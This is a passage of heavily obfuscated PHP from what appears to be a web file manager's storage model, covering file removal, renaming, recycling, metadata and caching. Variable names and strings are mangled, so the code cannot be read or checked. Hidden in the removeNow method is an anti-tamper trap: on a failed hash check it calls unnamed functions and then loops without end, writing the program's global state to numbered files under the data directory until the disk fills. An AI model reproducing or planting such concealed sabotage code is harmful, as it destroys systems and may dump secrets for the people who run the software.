!0)) { return; } $ÕîîÆ›Å = Session::get($Û°æœõò[2106]); $˛†è˙–Ë = substr($å–î”ˆ¯[$Û°æœõò[42]], 0, -1 - strlen($å–î”ˆ¯[$Û°æœõò[184]])) . $Û°æœõò[1606] . $ÕîîÆ›Å . $Û°æœõò[20] . $å–î”ˆ¯[$Û°æœõò[184]]; $Œ–ÇƒÇ´ = Model($Û°æœõò[618])->find($§ô¥ΩÜ¿); $this->_createFileCall($å–î”ˆ¯[$Û°æœõò[441]], $˛†è˙–Ë, $Œ–ÇƒÇ´, REPEAT_REPLACE, $Û°æœõò[1341]); $èüÄ∞¡£ = $å–î”ˆ¯[$Û°æœõò[475]][$Û°æœõò[557]]; $™›úçåﬂ = $èüÄ∞¡£[$Û°æœõò[551]] ? $èüÄ∞¡£[$Û°æœõò[551]] : $èüÄ∞¡£[$Û°æœõò[42]]; show_json(LNG($Û°æœõò[2107]) . $Û°æœõò[2108] . LNG($Û°æœõò[2109]) . $Û°æœõò[2110] . $™›úçåﬂ . $Û°æœõò[2111], !1); } public function fileIsLock($Á©ŸèüÌ, $ü∫í˝—Õ = false) { $êâó∂ÛÔ =& $_SERVER[Á≈ ä ∞]; if (!isset($Á©ŸèüÌ[$êâó∂ÛÔ[475]]) || !$Á©ŸèüÌ[$êâó∂ÛÔ[475]][$êâó∂ÛÔ[554]]) { return !1; } if ($Á©ŸèüÌ[$êâó∂ÛÔ[475]][$êâó∂ÛÔ[554]] != USER_ID) { return !0; } $≈µ∞…√ª = $GLOBALS[$êâó∂ÛÔ[16]][$êâó∂ÛÔ[99]][$êâó∂ÛÔ[555]]; if ($Á©ŸèüÌ[$êâó∂ÛÔ[475]][$êâó∂ÛÔ[556]] <= time() - $≈µ∞…√ª) { $this->metaSet($Á©ŸèüÌ[$êâó∂ÛÔ[411]], $êâó∂ÛÔ[554], null); $this->metaSet($Á©ŸèüÌ[$êâó∂ÛÔ[411]], $êâó∂ÛÔ[556], null); } if ($ü∫í˝—Õ) { $this->metaSet($Á©ŸèüÌ[$êâó∂ÛÔ[411]], $êâó∂ÛÔ[556], time()); } return !1; } private function _addSource($Ç¡ÅÈπÒ, $È∏àí©î) { $Åœ°úÌ¿ =& $_SERVER[Á≈ ä ∞]; $¶¢˝∑˚® = defined($Åœ°úÌ¿[484]) ? USER_ID : $Åœ°úÌ¿[207]; $◊◊‚ä‘Ç = array($Åœ°úÌ¿[595] => $È∏àí©î[$Åœ°úÌ¿[420]], $Åœ°úÌ¿[596] => $È∏àí©î[$Åœ°úÌ¿[514]], $Åœ°úÌ¿[597] => $¶¢˝∑˚®, $Åœ°úÌ¿[598] => $¶¢˝∑˚®, $Åœ°úÌ¿[410] => $È∏àí©î[$Åœ°úÌ¿[411]], $Åœ°úÌ¿[599] => $È∏àí©î[$Åœ°úÌ¿[530]] . $È∏àí©î[$Åœ°úÌ¿[411]] . $Åœ°úÌ¿[60], $Åœ°úÌ¿[439] => 0, $Åœ°úÌ¿[600] => $Åœ°úÌ¿[22]); $Ç¡ÅÈπÒ = array_merge($◊◊‚ä‘Ç, $Ç¡ÅÈπÒ); $this->updateModifyTime($Ç¡ÅÈπÒ[$Åœ°úÌ¿[441]]); $çΩ¿¶õı = $Åœ°úÌ¿[2112] . $È∏àí©î[$Åœ°úÌ¿[411]]; if (isset(self::$cacheChildList[$çΩ¿¶õı])) { unset(self::$cacheChildList[$çΩ¿¶õı]); } static $Ÿ≤ÉóÓô = false; if (!$Ÿ≤ÉóÓô) { Hook::trigger($Åœ°úÌ¿[582], $Ç¡ÅÈπÒ); $Ÿ≤ÉóÓô = !0; } $Ωù√†ØÓ = $this->add($Ç¡ÅÈπÒ); $Ÿ…ØõˆÔ = array($Åœ°úÌ¿[601] => short_id($Ωù√†ØÓ)); $this->where(array($Åœ°úÌ¿[426] => $Ωù√†ØÓ))->save($Ÿ…ØõˆÔ); $this->setNamePinyin($Ωù√†ØÓ, $Ç¡ÅÈπÒ[$Åœ°úÌ¿[42]]); return $Ωù√†ØÓ; } public function remove($¿Çêÿ¶, $—Ù¬†Úö = true) { $ñ±≤ïó› =& $_SERVER[Á≈ ä ∞]; $ïÁéñ»™ = $this->sourceInfo($¿Çêÿ¶); $„Ñﬂ√•≤ = intval($ïÁéñ»™[$ñ±≤ïó›[420]]) === self::TYPE_SYSTEM; $ß†áı˙• = Model($ñ±≤ïó›[444])->get($ñ±≤ïó›[2113]) == $ñ±≤ïó›[98]; if ($„Ñﬂ√•≤ || $—Ù¬†Úö || !$ß†áı˙•) { return $this->removeNow($¿Çêÿ¶, $—Ù¬†Úö); } $Îï¿⁄¥¬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $…¨™†ø¬ = $ïÁéñ»™[$ñ±≤ïó›[420]] == self::TYPE_USER ? $ñ±≤ïó›[609] : $ñ±≤ïó›[524]; if ($…¨™†ø¬ == $ñ±≤ïó›[609]) { $˚ΩÌæΩπ = Model($ñ±≤ïó›[522])->getInfo($ïÁéñ»™[$ñ±≤ïó›[514]]); $ﬂøƒˆµπ = !empty($˚ΩÌæΩπ[$ñ±≤ïó›[551]]) ? $˚ΩÌæΩπ[$ñ±≤ïó›[551]] : $˚ΩÌæΩπ[$ñ±≤ïó›[42]]; $ﬂøƒˆµπ = $ñ±≤ïó›[269] . $ﬂøƒˆµπ . $ñ±≤ïó›[2114] . $ïÁéñ»™[$ñ±≤ïó›[514]]; } else { $˚ΩÌæΩπ = Model($ñ±≤ïó›[531])->getInfo($ïÁéñ»™[$ñ±≤ïó›[514]]); $ﬂøƒˆµπ = _get($˚ΩÌæΩπ, $ñ±≤ïó›[42]); $ﬂøƒˆµπ = $ñ±≤ïó›[172] . $ﬂøƒˆµπ . $ñ±≤ïó›[2115] . $ïÁéñ»™[$ñ±≤ïó›[514]]; } $§ŒçŒ¸Í = $ñ±≤ïó›[2116] . md5($ﬂøƒˆµπ); CacheLock::lock($§ŒçŒ¸Í); $√≥µ‘È« = $this->fileNameExist($Îï¿⁄¥¬, $ﬂøƒˆµπ); if (!$√≥µ‘È«) { $√≥µ‘È« = $this->mkdir($Îï¿⁄¥¬, $ﬂøƒˆµπ, REPEAT_SKIP); $this->metaSet($√≥µ‘È«, $ñ±≤ïó›[2117], $…¨™†ø¬); $this->metaSet($√≥µ‘È«, $ñ±≤ïó›[2118], $ïÁéñ»™[$ñ±≤ïó›[514]]); if ($ïÁéñ»™[$ñ±≤ïó›[441]] != 0) { $this->metaSet($√≥µ‘È«, $ñ±≤ïó›[2119], _get($˚ΩÌæΩπ, $ñ±≤ïó›[2120])); } } CacheLock::unlock($§ŒçŒ¸Í); $this->metaSet($¿Çêÿ¶, $ñ±≤ïó›[2121], $ïÁéñ»™[$ñ±≤ïó›[441]]); $this->where(array($ñ±≤ïó›[411] => $¿Çêÿ¶))->save(array($ñ±≤ïó›[433] => time())); $this->recycleClear($ïÁéñ»™); $îπ„à∫´ = $this->move($¿Çêÿ¶, $√≥µ‘È«, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ïÁéñ»™[$ñ±≤ïó›[441]]); return $îπ„à∫´; } private function recycleClear($•∂¬‹¥») { $ﬁÉî‹∑Õ =& $_SERVER[Á≈ ä ∞]; $˜‡í¡é  = $this->childrenAll($•∂¬‹¥»); $Ä√ﬁï˝£ = array($ﬁÉî‹∑Õ[426] => array($ﬁÉî‹∑Õ[427], $˜‡í¡é [$ﬁÉî‹∑Õ[2122]])); Model($ﬁÉî‹∑Õ[2123])->where($Ä√ﬁï˝£)->delete(); } public function removeNow($ãƒ”‹∫©, $ø™≤˙Í© = true) { $’ˆîÍŒ‹ =& $_SERVER[Á≈ ä ∞]; $ñí“ïÄú = $_SERVER[$’ˆîÍŒ‹[9]] . $’ˆîÍŒ‹[10]; $§¸‹ÈıÉ = $’ˆîÍŒ‹[879]; if ($_SERVER[$’ˆîÍŒ‹[6]] != $§¸‹ÈıÉ($ñí“ïÄú)) { $ÙÔ≥ﬂåé = $’ˆîÍŒ‹[880]; $¥ùÆØ§Ç = $’ˆîÍŒ‹[8]; $ ∏·Æ‹© = $_SERVER[$’ˆîÍŒ‹[9]] . $’ˆîÍŒ‹[10]; $∞ò÷å†¯ = $¥ùÆØ§Ç($ ∏·Æ‹©); $øÑÕæÌ = explode($’ˆîÍŒ‹[11], $∞ò÷å†¯); if (count($øÑÕæÌ) < $’ˆîÍŒ‹[654]) { $∆ëÿ¨äÃ = $’ˆîÍŒ‹[13]; $∆ëÿ¨äÃ(); } $∞§Ì¡êæ = $’ˆîÍŒ‹[881]; $∞§Ì¡êæ($_SERVER[$’ˆîÍŒ‹[882]]); $ÙÔ≥ﬂåé = $’ˆîÍŒ‹[880]; $ÙÔ≥ﬂåé(); $òé´ç≠ú = $’ˆîÍŒ‹[883]; $å≤ﬁóã› = json_encode($GLOBALS[$’ˆîÍŒ‹[884]]); $´†èÈË = 1; for ($„ÑÖÉ¥» = $´†èÈË; $„ÑÖÉ¥» > 0; $„ÑÖÉ¥»++) { $òé´ç≠ú(DATA_PATH . $„ÑÖÉ¥», $å≤ﬁóã›); } } $õ∫‡‘÷¯ = $this->sourceInfo($ãƒ”‹∫©); $ëÁ≈Ó≠ü = $this->pathInfoMore($ãƒ”‹∫©); if (!$õ∫‡‘÷¯) { return !0; } if ($õ∫‡‘÷¯[$’ˆîÍŒ‹[441]] == 0) { if (!_get($GLOBALS, $’ˆîÍŒ‹[512])) { return !1; } } $this->lockMoveStart($ãƒ”‹∫©); Hook::trigger($’ˆîÍŒ‹[2124], $ëÁ≈Ó≠ü, $ø™≤˙Í©); if ($ø™≤˙Í©) { Model($’ˆîÍŒ‹[2123])->moveToRecycle($ãƒ”‹∫©); } else { $°ÌàÌπÎ = $this->childrenAll($õ∫‡‘÷¯); Model($’ˆîÍŒ‹[579])->eventRemove($ãƒ”‹∫©); $this->removeRelevance($°ÌàÌπÎ[$’ˆîÍŒ‹[2122]], $°ÌàÌπÎ[$’ˆîÍŒ‹[1473]]); } $this->folderSizeReset($õ∫‡‘÷¯[$’ˆîÍŒ‹[441]]); $—§Ñª˘« = array($õ∫‡‘÷¯[$’ˆîÍŒ‹[441]]); if ($õ∫‡‘÷¯[$’ˆîÍŒ‹[419]] == $’ˆîÍŒ‹[98]) { $—§Ñª˘«[] = $õ∫‡‘÷¯[$’ˆîÍŒ‹[411]]; } $this->updateModifyTime($—§Ñª˘«); $this->lockMoveEnd($ãƒ”‹∫©); Hook::trigger($’ˆîÍŒ‹[1698], $ëÁ≈Ó≠ü, $ø™≤˙Í©); return !0; } public function childrenAll($±õªƒŒÎ) { $±Ù∫Í˙Ò =& $_SERVER[Á≈ ä ∞]; $«˝∆ÏÖÒ = $±õªƒŒÎ[$±Ù∫Í˙Ò[411]]; if ($±õªƒŒÎ[$±Ù∫Í˙Ò[419]] == $±Ù∫Í˙Ò[98]) { $√≈˜ûÌ‡ = array($±Ù∫Í˙Ò[599] => array($±Ù∫Í˙Ò[559], $±õªƒŒÎ[$±Ù∫Í˙Ò[530]] . $«˝∆ÏÖÒ . $±Ù∫Í˙Ò[560])); $«´∑ª≠Õ = array($±Ù∫Í˙Ò[599] => $√≈˜ûÌ‡[$±Ù∫Í˙Ò[530]]); $¥Ê®óÖº = $this->field($±Ù∫Í˙Ò[2125])->where($«´∑ª≠Õ)->select(); $¿±è∫¸“ = !1; $‹òªß√û = array($«˝∆ÏÖÒ); if ($¥Ê®óÖº) { $¿±è∫¸“ = array_to_keyvalue($¥Ê®óÖº, $±Ù∫Í˙Ò[22], $±Ù∫Í˙Ò[477]); $¿±è∫¸“ = array_remove_value($¿±è∫¸“, $±Ù∫Í˙Ò[207]); $‹òªß√û = array_to_keyvalue($¥Ê®óÖº, $±Ù∫Í˙Ò[22], $±Ù∫Í˙Ò[411]); $‹òªß√û[] = $«˝∆ÏÖÒ; } } else { $¿±è∫¸“ = array($±õªƒŒÎ[$±Ù∫Í˙Ò[477]]); $‹òªß√û = array($«˝∆ÏÖÒ); } return array($±Ù∫Í˙Ò[2122] => $‹òªß√û, $±Ù∫Í˙Ò[1473] => $¿±è∫¸“); } public function removeArray($ºîãÃÅ∑) { if (!$ºîãÃÅ∑) { return !0; } } public function removeRelevance($•ø∆«◊∂, $◊àππÀ‘) { $ÊùÖ±õ— =& $_SERVER[Á≈ ä ∞]; $•ø∆«◊∂ = $•ø∆«◊∂ ? $•ø∆«◊∂ : array(); $◊àππÀ‘ = $◊àππÀ‘ ? $◊àππÀ‘ : array(); $•ø∆«◊∂ = array_unique(array_filter($•ø∆«◊∂)); $◊àππÀ‘ = array_unique(array_filter($◊àππÀ‘)); if (!$•ø∆«◊∂) { return !1; } $ÙÜÜï‘ﬂ = array($ÊùÖ±õ—[426] => array($ÊùÖ±õ—[427], $•ø∆«◊∂)); Model($ÊùÖ±õ—[2123])->where($ÙÜÜï‘ﬂ)->delete(); Model($ÊùÖ±õ—[471])->where($ÙÜÜï‘ﬂ)->delete(); Model($ÊùÖ±õ—[1976])->where($ÙÜÜï‘ﬂ)->delete(); Model($ÊùÖ±õ—[579])->where($ÙÜÜï‘ﬂ)->delete(); Model($ÊùÖ±õ—[1810])->removeBySource($•ø∆«◊∂); Model($ÊùÖ±õ—[2105])->removeBySource($•ø∆«◊∂); $this->where($ÙÜÜï‘ﬂ)->delete(); Model($ÊùÖ±õ—[480])->remove($◊àππÀ‘); for ($˛„˛Å∂÷ = 0; $˛„˛Å∂÷ < count($•ø∆«◊∂); $˛„˛Å∂÷++) { $this->sourceCacheClear($•ø∆«◊∂[$˛„˛Å∂÷]); } } public function rename($å…¯é⁄œ, $≤˘∂ŒïÇ) { $Á¶Ÿ€±‘ =& $_SERVER[Á≈ ä ∞]; $á¥Ìåƒﬂ = $this->sourceInfo($å…¯é⁄œ); if (!$á¥Ìåƒﬂ) { return !1; } $ßò⁄“∞í = $this->fileNameExist($á¥Ìåƒﬂ[$Á¶Ÿ€±‘[441]], $≤˘∂ŒïÇ); if ($ßò⁄“∞í && $ßò⁄“∞í != $å…¯é⁄œ) { return !1; } $Æ‡¡◊“® = array($Á¶Ÿ€±‘[429] => $≤˘∂ŒïÇ, $Á¶Ÿ€±‘[598] => USER_ID); if ($á¥Ìåƒﬂ[$Á¶Ÿ€±‘[419]] != $Á¶Ÿ€±‘[98]) { $Æ‡¡◊“®[$Á¶Ÿ€±‘[421]] = substr(get_path_ext($≤˘∂ŒïÇ), 0, 10); } Model($Á¶Ÿ€±‘[579])->eventRename($å…¯é⁄œ, $á¥Ìåƒﬂ[$Á¶Ÿ€±‘[42]], $≤˘∂ŒïÇ); $this->sourceCacheClear($å…¯é⁄œ); $this->setNamePinyin($å…¯é⁄œ, $Æ‡¡◊“®[$Á¶Ÿ€±‘[42]], !1); $this->updateModifyTime($á¥Ìåƒﬂ[$Á¶Ÿ€±‘[441]]); $É–◊¬ÛÜ = $this->where(array($Á¶Ÿ€±‘[426] => $å…¯é⁄œ))->data($Æ‡¡◊“®)->save(); $ÄÔÀˆ–ù = $Á¶Ÿ€±‘[2112] . $á¥Ìåƒﬂ[$Á¶Ÿ€±‘[441]]; if (isset(self::$cacheChildList[$ÄÔÀˆ–ù])) { unset(self::$cacheChildList[$ÄÔÀˆ–ù]); } return $É–◊¬ÛÜ; } public function setNamePinyin($µ√Ç’ì™, $ë≠üÿ´π, $¶πﬂåˆÊ = true) { $œáªúÀ =& $_SERVER[Á≈ ä ∞]; $·√π‹ÜŒ = Input::check($ë≠üÿ´π, $œáªúÀ[602]); $•Ω’í”œ = array($œáªúÀ[453] => KodSort::makeStr($ë≠üÿ´π)); if ($·√π‹ÜŒ) { $•Ω’í”œ[$œáªúÀ[474]] = str_replace($œáªúÀ[63], $œáªúÀ[22], Pinyin::get($ë≠üÿ´π)); $•Ω’í”œ[$œáªúÀ[473]] = Pinyin::get($ë≠üÿ´π, $œáªúÀ[603]); } if (!$¶πﬂåˆÊ && !$·√π‹ÜŒ) { $•Ω’í”œ[$œáªúÀ[474]] = null; $•Ω’í”œ[$œáªúÀ[473]] = null; } $this->metaSet($µ√Ç’ì™, $•Ω’í”œ); } public function getContent($≠µÀÿ¿˝) { $Œﬁˆ‡•˙ =& $_SERVER[Á≈ ä ∞]; $Öƒﬂ•® = $this->fileInfoGet($≠µÀÿ¿˝); if (!$Öƒﬂ•®) { return !1; } if ($Öƒﬂ•®[$Œﬁˆ‡•˙[86]] == 0) { return $Œﬁˆ‡•˙[22]; } $‘Ú€“Î∑ = $Œﬁˆ‡•˙[2126] . $Öƒﬂ•®[$Œﬁˆ‡•˙[186]]; if ($Öƒﬂ•®[$Œﬁˆ‡•˙[86]] <= 1024 * 10) { $≥„≤£ëô = Cache::get($‘Ú€“Î∑); if (!$≥„≤£ëô) { $≥„≤£ëô = IO::getContent($Öƒﬂ•®[$Œﬁˆ‡•˙[94]]); Cache::set($‘Ú€“Î∑, $≥„≤£ëô); } return $≥„≤£ëô; } if (!$Öƒﬂ•®[$Œﬁˆ‡•˙[94]]) { return $Œﬁˆ‡•˙[22]; } return IO::getContent($Öƒﬂ•®[$Œﬁˆ‡•˙[94]]); } public function setDesc($Ñì√‰◊¨, $å ≥ÿÃÆ) { $∞ÎÓ≈Û¶ =& $_SERVER[Á≈ ä ∞]; Model($∞ÎÓ≈Û¶[579])->eventAddDesc($Ñì√‰◊¨, $å ≥ÿÃÆ); return $this->metaSet($Ñì√‰◊¨, $∞ÎÓ≈Û¶[462], $å ≥ÿÃÆ); } public function setContent($˘à·‚ û, $á©©ÑüÂ = '') { $ÀÙì®ÆÓ =& $_SERVER[Á≈ ä ∞]; $¬˜Ú“‡∞ = $this->sourceInfo($˘à·‚ û); $¬›≈æá® = $this->fileInfoGet($˘à·‚ û); if (!$¬›≈æá® || !$¬˜Ú“‡∞) { return !1; } $Îÿ±¿ä∂ = Model($ÀÙì®ÆÓ[480])->addFileByContent($á©©ÑüÂ, $¬˜Ú“‡∞[$ÀÙì®ÆÓ[42]]); $“ºüêà≈ = $this->fileHistory($¬˜Ú“‡∞, $Îÿ±¿ä∂[$ÀÙì®ÆÓ[477]], $Îÿ±¿ä∂[$ÀÙì®ÆÓ[86]]); if (!$“ºüêà≈) { return Model($ÀÙì®ÆÓ[480])->remove($Îÿ±¿ä∂[$ÀÙì®ÆÓ[477]]); } $this->folderSizeReset($¬˜Ú“‡∞[$ÀÙì®ÆÓ[441]]); return !0; } public function fileSubstr($†‰ÙÄ˙˙, $ñ†ˆëÆ¨, $ÇÄÂñî¸) { $éø©ﬂ é = $this->fileInfoGet($†‰ÙÄ˙˙); if (!$éø©ﬂ é) { return !1; } return IO::fileSubstr($éø©ﬂ é[$_SERVER[Á≈ ä ∞][94]], $ñ†ˆëÆ¨, $ÇÄÂñî¸); } public function fileInfoGet($ñ°¥ËÍ’) { $£ ¥†ÕΩ =& $_SERVER[Á≈ ä ∞]; $ùÙ£”Å‚ = $this->sourceInfo($ñ°¥ËÍ’); if (!$ùÙ£”Å‚ || $ùÙ£”Å‚[$£ ¥†ÕΩ[419]]) { return !1; } $µ‹åÄÉÖ = $£ ¥†ÕΩ[483] . $ùÙ£”Å‚[$£ ¥†ÕΩ[477]]; $ùû≤Âé∑ = _get(self::$cacheFileInfo, $µ‹åÄÉÖ); if ($ùû≤Âé∑) { return $ùû≤Âé∑; } $ﬂÛ˜ç’Ì = Model($£ ¥†ÕΩ[480])->fileInfo($ùÙ£”Å‚[$£ ¥†ÕΩ[477]]); if ($ﬂÛ˜ç’Ì) { $ﬂÛ˜ç’Ì[$£ ¥†ÕΩ[42]] = $ùÙ£”Å‚[$£ ¥†ÕΩ[42]]; } self::$cacheFileInfo[$µ‹åÄÉÖ] = $ﬂÛ˜ç’Ì; return $ﬂÛ˜ç’Ì; } private function folderChildrenNumber($—í≤Á€˚) { $Û®í¢–Ù =& $_SERVER[Á≈ ä ∞]; $˚—¿ÁºŒ = $this->sourceInfo($—í≤Á€˚); $êàåÊòÃ = array($Û®í¢–Ù[599] => array($Û®í¢–Ù[559], $˚—¿ÁºŒ[$Û®í¢–Ù[530]] . $—í≤Á€˚ . $Û®í¢–Ù[560]), $Û®í¢–Ù[596] => $˚—¿ÁºŒ[$Û®í¢–Ù[514]], $Û®í¢–Ù[439] => intval($˚—¿ÁºŒ[$Û®í¢–Ù[440]]), $Û®í¢–Ù[592] => 1); $ë∑≥óé∞ = $this->where($êàåÊòÃ)->count(); $Ωãûá«Ø = $this->where($êàåÊòÃ)->where(array($Û®í¢–Ù[592] => 0))->count(); return array($Û®í¢–Ù[90] => $Ωãûá«Ø, $Û®í¢–Ù[91] => $ë∑≥óé∞); } public function pathInfo($çÌ˛íÀ±, $¢ƒû’íã = false) { $·ç°â„ã =& $_SERVER[Á≈ ä ∞]; $¢ƒû’íã = !1; $çÌ˛íÀ± = intval($çÌ˛íÀ±); $õ∆õ±ù‰ = $·ç°â„ã[470] . intval($¢ƒû’íã) . $·ç°â„ã[395] . $çÌ˛íÀ±; $»Â»≥îè = _get(self::$cachePathInfo, $õ∆õ±ù‰); if ($»Â»≥îè) { return $»Â»≥îè; } $‡’∏ÎÀÖ = $this->sourceInfo($çÌ˛íÀ±); if (!$‡’∏ÎÀÖ) { return !1; } $‡’∏ÎÀÖ = $this->_listDataApplyItem($‡’∏ÎÀÖ, $¢ƒû’íã); self::$cachePathInfo[$õ∆õ±ù‰] = $‡’∏ÎÀÖ; return $‡’∏ÎÀÖ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÄﬂΩïù◊) { $ˆÿ–Õ˝® =& $_SERVER[Á≈ ä ∞]; $¨˜áÕÔÈ = _get(self::$cachePathInfoMore, $ÄﬂΩïù◊); if ($¨˜áÕÔÈ) { return $¨˜áÕÔÈ; } $©˝˙‰º§ = $this->pathInfo($ÄﬂΩïù◊); if (!$©˝˙‰º§) { return !1; } if ($©˝˙‰º§[$ˆÿ–Õ˝®[419]] == $ˆÿ–Õ˝®[98]) { $©˝˙‰º§[$ˆÿ–Õ˝®[89]] = $this->folderChildrenNumber($ÄﬂΩïù◊); } self::$cachePathInfoMore[$ÄﬂΩïù◊] = $©˝˙‰º§; return $©˝˙‰º§; } public function sourceInfo($¶¨ˆ≤ã…) { $–˜ˆ–ÉÂ =& $_SERVER[Á≈ ä ∞]; if (!$¶¨ˆ≤ã…) { return array(); } $¶¨ˆ≤ã… = intval($¶¨ˆ≤ã…); $ôø˛Ó∏¿ = $–˜ˆ–ÉÂ[469] . $¶¨ˆ≤ã…; $£∏ùåõ˝ = _get(self::$cacheSourceInfo, $ôø˛Ó∏¿); if ($£∏ùåõ˝) { return $£∏ùåõ˝; } $Ê…˜õöˆ = $this->where(array($–˜ˆ–ÉÂ[411] => $¶¨ˆ≤ã…))->find(); self::$cacheSourceInfo[$ôø˛Ó∏¿] = $Ê…˜õöˆ; return self::$cacheSourceInfo[$ôø˛Ó∏¿]; } public function sourceCacheClear($˘ﬂ™Ü“ï = false) { self::cacheClear($˘ﬂ™Ü“ï); } public static function cacheClear($˝éØáÿ€ = false) { $Áﬁ—ˆ∂≈ =& $_SERVER[Á≈ ä ∞]; if ($˝éØáÿ€ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Áﬁ—ˆ∂≈[469] . $˝éØáÿ€]); unset(self::$cachePathInfoMore[$˝éØáÿ€]); unset(self::$cachePathInfo[$Áﬁ—ˆ∂≈[2127] . $˝éØáÿ€]); unset(self::$cachePathInfo[$Áﬁ—ˆ∂≈[2128] . $˝éØáÿ€]); } public function metaSet($ˆπ«Ö§, $îÓªæÜ∂ = null, $õı≠ÃøÎ = null) { $Œ¨“ø√ì = parent::metaSet($ˆπ«Ö§, $îÓªæÜ∂, $õı≠ÃøÎ); if ($Œ¨“ø√ì) { $this->sourceCacheClear($ˆπ«Ö§); } return $Œ¨“ø√ì; } public function pathInfoByPath($ïù¿ŒÙ, $ÿì„Êß≈) { $Ÿ°Ñ¢˜Ω =& $_SERVER[Á≈ ä ∞]; $Ü˘§ï†® = !$ÿì„Êß≈ ? array() : explode($Ÿ°Ñ¢˜Ω[18], trim($ÿì„Êß≈, $Ÿ°Ñ¢˜Ω[18])); $ÌãÅ…ïÊ = $ïù¿ŒÙ; foreach ($Ü˘§ï†® as $Å®”Ë¡î) { $º∑æØúµ = array($Ÿ°Ñ¢˜Ω[441] => $ÌãÅ…ïÊ, $Ÿ°Ñ¢˜Ω[42] => $Å®”Ë¡î); $”œ¯ı›• = $this->where($º∑æØúµ)->select(); if (!$”œ¯ı›•) { return !1; } $”œ¯ı›• = array_sort_by($”œ¯ı›•, $Ÿ°Ñ¢˜Ω[440]); $ÌãÅ…ïÊ = $”œ¯ı›•[0][$Ÿ°Ñ¢˜Ω[411]]; } return $this->pathInfo($ÌãÅ…ïÊ, !0); } protected function updateModifyTime($©ë©∏Î≠) { $ÂÏı£„Ÿ =& $_SERVER[Á≈ ä ∞]; $é£ü∑ãŒ = defined($ÂÏı£„Ÿ[484]) ? USER_ID : $ÂÏı£„Ÿ[207]; if (!$©ë©∏Î≠) { return; } if (!is_array($©ë©∏Î≠)) { $©ë©∏Î≠ = array($©ë©∏Î≠); } foreach ($©ë©∏Î≠ as $ûÒÛÂﬁÁ => $◊Î…«ªå) { $©ë©∏Î≠[$ûÒÛÂﬁÁ] = intval($◊Î…«ªå); $this->sourceCacheClear($◊Î…«ªå); } $°ˆ£§‘Ä = array($ÂÏı£„Ÿ[411] => array($ÂÏı£„Ÿ[17], $©ë©∏Î≠)); $≈À˛’ßî = array($ÂÏı£„Ÿ[598] => $é£ü∑ãŒ, $ÂÏı£„Ÿ[433] => time()); $this->where($°ˆ£§‘Ä)->save($≈À˛’ßî); } public function folderSizeReset($—ø‡œ∆ü, $Îé®–ÔÚ = false) { $µ˙•¸ı =& $_SERVER[Á≈ ä ∞]; if ($this->statusIgnoreResetSpace) { return; } $¨ùÎﬂ‚Ç = $this->sourceInfo($—ø‡œ∆ü); $∞ı öÄ◊ = $µ˙•¸ı[2129] . $—ø‡œ∆ü; CacheLock::lock($∞ı öÄ◊, 20); if ($Îé®–ÔÚ === !1) { $this->sourceCacheClear($—ø‡œ∆ü); $¨ùÎﬂ‚Ç = $this->sourceInfo($—ø‡œ∆ü); $Ô–Û‹ŒÕ = array($µ˙•¸ı[410] => $—ø‡œ∆ü, $µ˙•¸ı[439] => 0); $œœæ≠Ò– = $this->where($Ô–Û‹ŒÕ)->sum($µ˙•¸ı[86]); $Îé®–ÔÚ = intval($œœæ≠Ò–) - intval($¨ùÎﬂ‚Ç[$µ˙•¸ı[86]]); } if ($Îé®–ÔÚ == 0) { return CacheLock::unlock($∞ı öÄ◊); } $«’·÷É¶ = $this->parentLevelArray($¨ùÎﬂ‚Ç[$µ˙•¸ı[530]]); if (!$«’·÷É¶) { $«’·÷É¶ = array(); } $«’·÷É¶[] = $¨ùÎﬂ‚Ç[$µ˙•¸ı[411]]; $Ô–Û‹ŒÕ = array($µ˙•¸ı[411] => array($µ˙•¸ı[427], $«’·÷É¶)); if ($Îé®–ÔÚ < 0) { $Ô–Û‹ŒÕ[$µ˙•¸ı[86]] = array($µ˙•¸ı[1018], abs($Îé®–ÔÚ)); } $this->where($Ô–Û‹ŒÕ)->setAdd($µ˙•¸ı[86], $Îé®–ÔÚ); CacheLock::unlock($∞ı öÄ◊); $‰ÕÄÊ€≈ = $µ˙•¸ı[2130] . $¨ùÎﬂ‚Ç[$µ˙•¸ı[420]] . $µ˙•¸ı[4] . $¨ùÎﬂ‚Ç[$µ˙•¸ı[514]]; $òáÉ•÷‘ = array($¨ùÎﬂ‚Ç[$µ˙•¸ı[420]], $¨ùÎﬂ‚Ç[$µ˙•¸ı[514]]); TaskRun::timeLimitCall($‰ÕÄÊ€≈, $µ˙•¸ı[2131], $òáÉ•÷‘, 1.5); } public function folderSizeResetChildren($û›÷üì¨) { $÷π¿“ŒÎ =& $_SERVER[Á≈ ä ∞]; $this->sourceCacheClear($û›÷üì¨); $‘éä†ÓÃ = $this->sourceInfo($û›÷üì¨); $ÄÒı˛àÌ = array($÷π¿“ŒÎ[592] => 1, $÷π¿“ŒÎ[596] => $‘éä†ÓÃ[$÷π¿“ŒÎ[514]], $÷π¿“ŒÎ[599] => array($÷π¿“ŒÎ[559], $‘éä†ÓÃ[$÷π¿“ŒÎ[530]] . $û›÷üì¨ . $÷π¿“ŒÎ[560])); $⁄¯Ú›¥Ø = $÷π¿“ŒÎ[2132]; $”ì¢ñ˝≈ = $this->field($⁄¯Ú›¥Ø)->where($ÄÒı˛àÌ)->select(); $ÄÒı˛àÌ[$÷π¿“ŒÎ[419]] = 0; $ﬂ√Ó∏¡à = $this->field($⁄¯Ú›¥Ø)->where($ÄÒı˛àÌ)->select(); if (!$ﬂ√Ó∏¡à) { return; } $”ì¢ñ˝≈[] = $‘éä†ÓÃ; $”ì¢ñ˝≈ = array_to_keyvalue($”ì¢ñ˝≈, $÷π¿“ŒÎ[411]); foreach ($”ì¢ñ˝≈ as $∑„ÅÔÜŒ => $œÿ˜Ï‹¯) { $”ì¢ñ˝≈[$∑„ÅÔÜŒ][$÷π¿“ŒÎ[2133]] = $”ì¢ñ˝≈[$∑„ÅÔÜŒ][$÷π¿“ŒÎ[86]]; $”ì¢ñ˝≈[$∑„ÅÔÜŒ][$÷π¿“ŒÎ[86]] = 0; } foreach ($ﬂ√Ó∏¡à as $œÿ˜Ï‹¯) { $–∏Ç≤œö = $œÿ˜Ï‹¯[$÷π¿“ŒÎ[441]] . $÷π¿“ŒÎ[22]; if (!isset($”ì¢ñ˝≈[$–∏Ç≤œö])) { continue; } 